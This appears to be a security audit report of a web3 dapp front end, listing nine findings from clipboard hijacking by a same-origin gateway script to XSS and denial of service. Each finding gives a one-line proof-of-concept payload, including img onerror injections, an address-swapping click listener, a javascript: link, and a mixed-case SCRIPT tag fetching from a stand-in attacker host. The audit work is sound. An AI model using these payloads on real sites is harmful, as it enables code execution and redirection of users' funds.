# Independent front-end security review

I reviewed all nine scoped files in full and did not inspect Solidity or out-of-scope `app/` files. No network access was used. A local Node probe was used for the script-tag guard. I could not run the intended Chromium spot-check because both cached Chromium launchers terminated under this harness with `Operation not permitted`; the findings below do not depend on that browser run.

Severity scale:

- **Critical** — arbitrary code or transaction/clipboard control in the application's trusted execution context, with no further application-level privilege required.
- **High** — practical code execution or a credible path to irreversible loss/corruption of a user's intended transaction.
- **Medium** — material integrity or availability failure requiring a stronger precondition, or a transaction that is accepted by the UI but cannot achieve its stated effect.
- **Low** — limited-impact issue or one whose attacker already needs substantial control of the embedding context.

## F-01 — Critical — The gateway's earlier same-origin script can silently change what is displayed, copied, or sent

**Location:** `app/src/index.html:13` (the injection point precedes every application script at `app/src/index.html:16-25`); affected security-sensitive sinks include `app/src/index.html:373-382` and `app/src/index.html:941-964`.

The application has no trust boundary from the gateway-injected script described in the review assumptions. That script runs first in the same global, can register earlier capturing listeners, replace globals and methods, mutate `data-copy`/`data-send`, observe every repaint, and rewrite the DOM after the application has verified a value. This is especially consequential here because the page asks users to carry calldata to a vault and uses the clipboard as a security-sensitive output. `rel="noopener"`, `esc()`, transaction preflights, and the hold control do not constrain an already-running same-origin script. The gateway script can also invoke `window.ethereum.request` directly or replace the provider before `discover()` selects it.

**One-line reproduction:** prepend the gateway's injected block with `addEventListener('click',e=>{const n=e.target.closest('.cp');if(n)n.dataset.copy='0x000000000000000000000000000000000000dEaD'},true)`, then click the copy icon beside any unchanged displayed address; the application copies the attacker value.

The `access-control-allow-origin: *` response is not itself the privilege escalation; the decisive privilege is execution before the dapp in the same browsing context. The on-chain bytes therefore do not authenticate the UI behavior a gateway visitor actually executes.

## F-02 — High — Unvalidated build substitutions become executable DOM and JavaScript

**Location:** `app/build.mjs:73-84`, with a directly exploitable sink at `app/src/index.html:1878` (and the substitutions originate in `app/build.mjs:37-59`).

`--set` keys overwrite the values derived from the broadcast log without any per-token validation, and `substitute()` performs raw textual replacement. The resulting values are placed inside JavaScript string literals at `app/src/index.html:34`; several are later interpolated into `innerHTML`. `version.mjs` validates the version read from an `App` constructor, but that protection is bypassed because the subsequent `--set VERSION=...` assignment overwrites it. Address, block, salt, and chain substitutions likewise have no type-specific validation at the substitution boundary.

**One-line reproduction:** build with `--set 'VERSION=<img src=x onerror=alert(document.domain)>'` (and the ordinary required deployment values), open `#/docs`, and the image inserted by `${CFG.version}` at line 1878 executes.

Values containing quotes can also break out of the object literal at line 34, so this is not limited to the later HTML sink. A compromised or simply incorrect build invocation can publish active code in the immutable artifact while still satisfying the unresolved-token check.

## F-03 — High — Provider-supplied hashes are interpolated into markup without validation or escaping

**Location:** `app/src/index.html:159-168` and `app/src/index.html:363-370`; the history path reaches the same sink at `app/src/index.html:757`.

`ext()` assumes that `v` is a canonical address or hash, but inserts it raw into `title`, `aria-label`, `data-copy`, and an explorer `href`. No schema check precedes the call. A transaction hash is taken verbatim from `eth_sendTransaction`; log transaction hashes are taken verbatim from `eth_getLogs`. Those are EIP-1193/provider inputs under the stated threat model, not values proven to have the JSON-RPC hex shape. `esc()` is not applied to `v`.

**One-line reproduction:** make the selected EIP-1193 provider return `"><img src=x onerror=alert(document.domain)>` from `eth_sendTransaction`, then click any enabled write; `tx()` passes it to `ext()` and `txSay().innerHTML`, executing the handler.

The same payload in a syntactically otherwise-valid `eth_getLogs` result's `transactionHash` executes when a history row is painted. Code execution in this origin can alter later transaction controls and clipboard output.

## F-04 — High — The beneficiary editor accepts a bad-checksum address and encodes it as an irreversible recipient

**Location:** `app/src/index.html:867-875`, `app/src/index.html:897-905`, and `app/src/model.js:171-173`.

All other address entry flows call `checksumOk()`, but `editorState()` only checks `isAddr()`. The editor's `change` handler does call `addrField()` and can display `BAD_SUM`; immediately afterward it calls `editorPaint()`, whose `editorState()` still returns `ok: true`, so the create/queue control remains enabled. `tableFrom()` then converts the mistyped string to the same 20 address bytes and sends it. The chain cannot enforce an EIP-55 checksum because case is not part of an address, so a successful create or applied table permanently pays the unintended address.

**One-line reproduction:** enter a one-row 100% table with `0x52908400098527886e0F7030069857D2E4169EE7` (the case of one letter is flipped from its checksum), leave the field, and deploy or queue it; the UI shows the checksum warning but still enables and encodes the table.

This is a display/transaction integrity failure on the primary value the product distributes, with a plausible irreversible-loss outcome.

## F-05 — Medium — Percentage validation can queue a table whose encoded basis points do not total 100%

**Location:** `app/src/index.html:858-875`, `app/src/index.html:1322-1326`, and `app/src/model.js:171-173`.

The validator decides that the decimal percentages total 100% within a `0.005` tolerance, while `tableFrom()` independently rounds each row to integer basis points. It never checks the sum of the rounded values. Thus the UI can claim the table is valid and wrap it in `propose(bytes)`, even though the encoded table fails the exact 10,000-basis-point invariant stated by this same document. Because proposal calldata is opaque, the invalid action can be queued successfully and fail only when someone later tries to apply it. Negative percentages are also not rejected, and the zero address passes `isAddr()` despite the scoped docs saying it is forbidden.

**One-line reproduction:** on a distribution with a nonzero delay, enter three distinct rows at `33.334%` each and click Queue; `editorState()` accepts total `100.002%`, but `tableFrom()` encodes `3333 + 3333 + 3333 = 9999`, leaving an unappliable queued action.

The owner can eventually cancel the entry, but the advertised change cannot land and may sit through the full delay before the mismatch is discovered.

## F-06 — Medium — The inline-script gate is case-sensitive although HTML script tags are not

**Location:** `app/inline-scripts.mjs:9-25` and `app/inline-scripts.mjs:29-39`.

`scriptTags()` searches only for the lowercase byte sequence `<script`. HTML tag names are ASCII-case-insensitive, so `<SCRIPT src=...>`, `<ScRiPt type=module>`, and equivalent forms create real script elements but are invisible to the guard. This defeats the build's stated safety invariant that every script is inline and attribute-free. It also composes with build-time injection: an injected mixed-case closing/opening sequence can introduce a fetched script without making `assertInlineScripts()` fail.

**One-line reproduction:** `assertInlineScripts('<SCRIPT src="https://attacker.invalid/x.js"></SCRIPT>')` returns normally even though a browser creates an external script element.

I confirmed this behavior with the scoped module under Node: mixed-case tags produced an empty `scriptTags()` result, while the lowercase equivalent threw.

## F-07 — Medium — A lying widget RPC can lock the host tab through unbounded synchronous ABI loops

**Location:** `app/src/widget.js:117-148`, especially `app/src/widget.js:129`.

The widget accepts arbitrary `data-rpc` responses, checks only that the response string has at least 642 characters, then trusts every ABI offset and array length. `arr()` executes a synchronous `for (i < n)` and pushes one object per claimed element. A malicious or compromised public endpoint can put a huge integer in the table or pending-array length word. `try/catch` cannot make this safe: the loop occupies the main thread and will run until the tab hangs or exhausts memory. No response-size, offset, array-length, or beneficiary-count bound is enforced before iteration.

**One-line reproduction:** point `data-rpc` at an endpoint whose `snapshot()` result has the normal `0x20` struct head and table offset but `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff` as the table length; mounting the widget enters the line-129 loop and freezes/OOMs the page.

This affects a host that selected a public RPC and later receives a malicious response; it does not require the RPC to execute script or defeat HTML escaping.

## F-08 — Low — `data-link` accepts active URL schemes; HTML escaping does not make the `href` safe

**Location:** `app/src/widget.js:193-198`.

The widget treats `data-link` as a URL but performs only HTML escaping. A `javascript:` value remains an active navigation after `esc()`, and the appended hash can be commented out in the JavaScript URL. `target="_blank" rel="noopener"` removes the opener relationship but is not a URL-scheme allowlist; an active URL can still execute in the navigation context under the host's origin. This is most relevant where a host loads the widget globally but allows less-trusted content to supply `data-*` attributes: the widget upgrades an otherwise inert attribute into an executable link.

**One-line reproduction:** mount `<div data-rake="0x0000000000000000000000000000000000000001" data-link="javascript:alert(document.domain)//"></div>` and click `view ↗`.

If the embedding page's own fully trusted code supplied the attribute, it already has equivalent authority; that stronger precondition is why this is Low rather than High.

## F-09 — Medium — Broadcast “pairability” does not actually verify the hash join it claims to trust

**Location:** `app/broadcast.mjs:42-47`, `app/broadcast.mjs:61-70`, and the resulting substitution at `app/build.mjs:48-49`.

`pairable()` checks only that there is exactly one creation and that the receipt and transaction arrays have equal lengths. It does not require unique transaction hashes, require every transaction hash to match exactly one receipt, or prove that the receipt selected for the creation is that creation's receipt. `creations()` then trusts `blocks.get(t.hash)`. The malformed-log condition discussed in this module can therefore still produce a plausible but wrong creation block rather than `null`. That block becomes `__DISTRIBUTIONFACTORY_BLOCK__`, and the dapp starts all factory/history scans there; a block that is too late silently omits real creations and events.

**One-line reproduction:** pass `creations()` a log with two transactions (one `CREATE`, one call) that both claim hash `0xcall`, plus two receipts of equal count where the `0xcall` receipt is at block 100; `pairable()` returns true and assigns block 100 to the creation even if its actual receipt/block was the other entry.

This is an integrity failure in a build-time guard specifically intended to turn uncertain pairing into a refusal; the output can instead ship a history boundary the bytes do not justify.
